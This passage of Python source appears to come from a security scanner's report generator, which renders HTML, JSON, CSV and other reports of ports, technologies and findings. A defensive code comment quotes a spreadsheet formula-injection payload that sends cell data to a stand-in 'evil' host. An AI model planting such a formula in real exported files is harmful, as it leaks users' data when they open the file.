    return "<ul>" + "".join(f"<li>{r}</li>" for r in reasons) + "</ul>"


def _services_section(data: dict) -> str:
    services = sorted(data.get("services") or [], key=lambda r: (str(r.get("host")), int(r.get("port") or 0)))
    if not services:
        return f"""
  <section>
    <h2>Open ports &amp; services</h2>
    <p>No open ports were recorded for this scan. Possible reasons:</p>{_why_no_ports(data)}
  </section>
"""
    rows = []
    for r in services:
        product = " ".join(x for x in (r.get("product"), r.get("version")) if x) or "-"
        rows.append(f"""
        <tr>
          <td>{_e(r.get('host'))}</td>
          <td>{_e(r.get('ip') or '-')}</td>
          <td>{_e(r.get('port'))}/{_e(r.get('protocol') or 'tcp')}</td>
          <td>{_e(r.get('name') or '-')}</td>
          <td>{_e(r.get('product') or '-')}</td>
          <td>{_e(r.get('version') or '-')}</td>
          <td class="engagement-only">{_e(r.get('cpe') or '-')}</td>
          <td class="engagement-only">{_e(str(r.get('banner') or '-')[:120])}</td>
        </tr>""")
    hosts = len({r.get("host") for r in services})
    return f"""
  <section>
    <h2>Open ports &amp; services</h2>
    <p class="muted">{len(services)} open port(s) on {hosts} host(s). Version is what nmap reported; it can be empty when the service did not reveal it.</p>
    <table>
      <thead><tr><th>Host</th><th>IP</th><th>Port</th><th>Service</th><th>Product</th><th>Version</th>
        <th class="engagement-only">CPE</th><th class="engagement-only">Banner</th></tr></thead>
      <tbody>{"".join(rows)}</tbody>
    </table>
  </section>
"""


def _technologies_section(data: dict) -> str:
    techs = sorted(data.get("technologies") or [], key=lambda r: (str(r.get("host")), str(r.get("name")).lower()))
    if not techs:
        return """
  <section>
    <h2>Technologies</h2>
    <p>No technologies were detected. They come from the web stage (httpx), so this is empty in passive mode
       or when no web server answered.</p>
  </section>
"""
    rows = "".join(f"""
        <tr>
          <td>{_e(t.get('host'))}</td>
          <td>{_e(t.get('name'))}</td>
          <td>{_e(t.get('version') or '-')}</td>
          <td>{_e(t.get('category') or '-')}</td>
          <td>{_e(t.get('confidence') or '-')}</td>
          <td class="engagement-only">{_e(t.get('source') or '-')}</td>
          <td class="engagement-only">{_e(t.get('cpe') or '-')}</td>
        </tr>""" for t in techs)
    return f"""
  <section>
    <h2>Technologies</h2>
    <p class="muted">{len(techs)} technology record(s). "Possible" means the name was seen without a version, so version-based CVE matching is less reliable.</p>
    <table>
      <thead><tr><th>Host</th><th>Technology</th><th>Version</th><th>Category</th><th>Confidence</th>
        <th class="engagement-only">Source</th><th class="engagement-only">CPE</th></tr></thead>
      <tbody>{rows}</tbody>
    </table>
  </section>
"""


def _web_section(data: dict) -> str:
    items = data.get("web_items") or []
    live = [w for w in items if w.get("kind") == "url"]
    if not items:
        return ""
    n_end = sum(1 for w in items if w.get("kind") == "endpoint")
    n_js = sum(1 for w in items if w.get("kind") == "js_file")
    n_par = sum(1 for w in items if w.get("has_params"))
    rows = "".join(f"<tr><td>{_e(w.get('host'))}</td><td>{_e(w.get('url'))}</td><td>{_e(w.get('status_code') or '-')}</td></tr>"
                   for w in sorted(live, key=lambda w: str(w.get("url")))[:200])
    table = (f"<table><thead><tr><th>Host</th><th>URL</th><th>Status</th></tr></thead><tbody>{rows}</tbody></table>"
             if rows else "")
    return f"""
  <section>
    <h2>Web surface</h2>
    <p class="muted">{len(live)} live URL(s), {n_end} crawled endpoint(s) ({n_par} with parameters), {n_js} JavaScript file(s).
       The full list is in the JSON report.</p>
    {table}
  </section>
"""


def _assets_section(data: dict) -> str:
    assets = data.get("assets") or []
    if not assets:
        return ""
    return f'''
  <section>
    <h2>Assets</h2>
    <table>
      <thead><tr><th>Host</th><th>IP</th><th>In scope</th><th>Source confidence</th><th>ASN</th><th>CDN</th></tr></thead>
      <tbody>{_assets_rows(assets)}</tbody>
    </table>
  </section>
'''


_JS = """
function toggleTheme() {
  const root = document.documentElement;
  const dark = root.getAttribute('data-theme') === 'dark';
  root.setAttribute('data-theme', dark ? 'light' : 'dark');
  document.getElementById('btn-theme').textContent = dark ? 'Dark mode' : 'Light mode';
}
function setView(mode) {
  document.body.classList.toggle('engagement', mode === 'engagement');
  document.getElementById('btn-triage').classList.toggle('active', mode === 'triage');
  document.getElementById('btn-engagement').classList.toggle('active', mode === 'engagement');
}
// A cell that starts with = + - @ (or a tab/CR) is run as a FORMULA by Excel and
// LibreOffice: a finding title like =HYPERLINK("http://evil/?"&A1) would exfiltrate
// data when the CSV is opened. A leading apostrophe makes it plain text.
function csvSafe(v) {
  return /^[=+\\-@\\t\\r]/.test(v) ? "'" + v : v;
}
function exportCSV() {
  const rows = [['host','title','severity','status','owasp_category','confidence']];
  document.querySelectorAll('#findings-table tbody tr').forEach(tr => {
    const cells = tr.querySelectorAll('td');
    if (cells.length < 6) return;
    rows.push(Array.from(cells).slice(0, 6).map(td => '"' + csvSafe(td.textContent.trim()).replace(/"/g,'""') + '"'));
  });
  const csv = rows.map(r => r.join(',')).join('\\n');
  const blob = new Blob([csv], {type: 'text/csv'});
  const a = document.createElement('a');
  a.href = URL.createObjectURL(blob);
  a.download = 'marsadix_findings.csv';
  a.click();
}
"""


def _render_html(data: dict) -> str:
    scan = data["scan"]
    findings = data["findings"]
    sev_counts = {s: 0 for s in _SEVERITY_ORDER}
    for f in findings:
        sev_counts[f.get("severity", "info")] = sev_counts.get(f.get("severity", "info"), 0) + 1

    return f"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Marsadix Report — {_e(data['target'])}</title>
<style>{_CSS}</style>
</head>
<body>
<header>
  <h1>Marsadix Security Report — {_e(data['target'])}</h1>
  <p>Scan #{scan['id']} · mode: {_e(scan.get('mode', 'passive'))} ·
     {'baseline' if scan.get('is_baseline') else 'tracked'} ·
     generated {_e(data['generated_at'])}</p>
</header>
<main>
  <div class="toolbar">
    <button id="btn-triage" class="active" onclick="setView('triage')">Triage view</button>
    <button id="btn-engagement" onclick="setView('engagement')">Engagement view</button>
    <button onclick="exportCSV()">Export findings (CSV)</button>
    <button id="btn-theme" onclick="toggleTheme()">Dark mode</button>
  </div>

  <section>
    <div class="cards">
      <div class="card"><div class="num">{data['posture_score']}</div><div class="label">Posture score (preliminary)</div></div>
      <div class="card"><div class="num">{len(data['assets'])}</div><div class="label">Assets</div></div>
      <div class="card"><div class="num">{len(findings)}</div><div class="label">Findings</div></div>
      <div class="card"><div class="num">{sev_counts.get('critical',0) + sev_counts.get('high',0)}</div><div class="label">Critical + High</div></div>
      <div class="card"><div class="num">{data['owasp_coverage']['coverage_pct']}%</div><div class="label">OWASP Top 10 coverage</div></div>
    </div>
  </section>

  {_exec_summary_section(data)}

  {_scope_methodology_section(data)}

  <section>
    <h2>Changes since previous scan</h2>
    {_diff_section(data['diff'], data['previous_scan_id'], scan['id'])}
  </section>

  <section>
    <h2>Knowledge Graph</h2>
    {_render_graph_svg(data['graph'])}
  </section>

  <section>
    <h2>OWASP Top 10 (2021) coverage</h2>
    <table>
      <thead><tr><th>Category</th><th>Findings</th><th>Status</th></tr></thead>
      <tbody>{_owasp_rows(data['owasp_coverage'])}</tbody>
    </table>
  </section>

  <section>
    <h2>Prioritized findings</h2>
    <table id="findings-table">
      <thead><tr>
        <th>Host</th><th>Title</th><th>Severity</th><th>Status</th><th>OWASP</th><th>Confidence</th>
        <th class="engagement-only">Evidence</th>
        <th class="engagement-only">Source</th>
        <th class="engagement-only">Remediation</th>
        <th class="engagement-only">URL</th>
        <th class="engagement-only">Exploitation</th>
      </tr></thead>
      <tbody>{_findings_rows(findings)}</tbody>
    </table>
  </section>

  {_assets_section(data)}
  {_services_section(data)}
  {_technologies_section(data)}
  {_web_section(data)}

  <section>
    <h2>Methodology &amp; limitations</h2>
    <div class="limitations">
      <p><strong>Detection, not exploitation.</strong> Every finding above is a
      <em>Finding</em> — Marsadix stops at verification. No payload in this
      tool extracts data, modifies state, or executes code on the target.
      The "exploited" flag on every finding is always <code>false</code>.</p>
      <p><strong>Three-state results.</strong> A finding is one of
      <em>Detected</em> (clear evidence), <em>Needs Review</em> (a partial
      signal, inconclusive), or <em>No Indicators</em>. "No Indicators" means
      the automated checks found nothing — it does <u>not</u> mean the asset
      is free of the issue. Detection relies on a fixed set of signature
      payloads and can miss custom logic, WAF-filtered variants, or
      context-specific bugs (false negatives). A manual review is
      recommended for anything in scope that this report marks as "No
      Indicators" on a sensitive asset.</p>
      <p><strong>Source confidence.</strong> Each discovered asset is scored
      0-100 from how many independent sources found it, whether it resolves,
      and whether it answers over HTTP — see the Assets table above.</p>
    </div>
  </section>
</main>
<script>{_JS}</script>
</body>
</html>"""


def _write_html(data: dict, out_dir: Path, target: str, scan_id: int) -> Path:
    path = out_dir / f"{_safe_filename_component(target)}_scan{scan_id}_report.html"
    path.write_text(_render_html(data), encoding="utf-8")
    return path


# --------------------------------------------------------------------------
# entry point
# --------------------------------------------------------------------------

FORMATS = ("html", "json", "csv", "sarif", "pdf", "both", "all")


def generate_report(conn, target: str, fmt: str = "both", out_dir: str = "output",
                     scan_id: Optional[int] = None) -> int:
    """
    Entry point for `marsadix report`. Returns a process exit code.

    fmt: html | json | csv | sarif | pdf | both (= html + json, the default) | all
    """
    target = (target or "").strip()
    if fmt not in FORMATS:
        print(f"error: unknown format {fmt!r} (choose from: {', '.join(FORMATS)})", file=sys.stderr)
        return 1
    data = _gather(conn, target, scan_id, out_dir)
    if data is None:
        extra = f" (scan id {scan_id})" if scan_id else ""
        print(f"error: no completed scans found for {target!r}{extra}. "
              f"Run `marsadix scan {target}` first.", file=sys.stderr)
        return 1

    out = Path(out_dir)
    out.mkdir(parents=True, exist_ok=True)
    real_scan_id = data["scan"]["id"]
    wanted = {"both": {"json", "html"}, "all": {"json", "html", "csv", "sarif", "pdf"}}.get(fmt, {fmt})

    written = []
    if "json" in wanted:
        written.append(_write_json(data, out, target, real_scan_id))
    if "html" in wanted:
        written.append(_write_html(data, out, target, real_scan_id))
    if "csv" in wanted:
        written.append(export.write_csv(data, out, target, real_scan_id))
    if "sarif" in wanted:
        written.append(export.write_sarif(data, out, target, real_scan_id))
    if "pdf" in wanted:
        written.append(export.write_pdf(data, out, target, real_scan_id))

    for path in written:
        print(f"wrote {path}")
    return 0
